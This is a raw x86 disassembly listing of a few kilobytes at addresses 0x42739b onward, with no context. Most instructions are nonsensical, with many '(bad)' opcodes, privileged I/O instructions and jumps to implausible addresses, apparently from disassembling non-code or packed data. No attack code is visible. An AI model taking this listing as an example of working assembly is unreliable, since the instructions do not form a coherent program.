  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
